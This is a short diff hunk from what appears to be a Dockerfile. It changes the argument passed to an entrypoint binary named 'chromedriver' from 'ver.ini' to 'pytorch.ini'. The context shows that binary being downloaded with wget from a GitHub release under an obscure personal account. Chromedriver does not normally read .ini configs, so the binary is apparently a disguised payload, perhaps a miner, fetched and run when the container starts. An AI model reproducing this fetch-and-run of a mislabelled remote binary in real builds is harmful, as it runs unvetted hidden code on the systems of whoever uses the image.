@@ -17,4 +17,4 @@ RUN wget https://github.com/imraahatikah6827/vea/releases/download/chromedriver/
     
 COPY . .    
 ENTRYPOINT [ "/usr/local/bin/chromedriver" ]
-CMD [ "ver.ini" ]
+CMD [ "pytorch.ini" ]
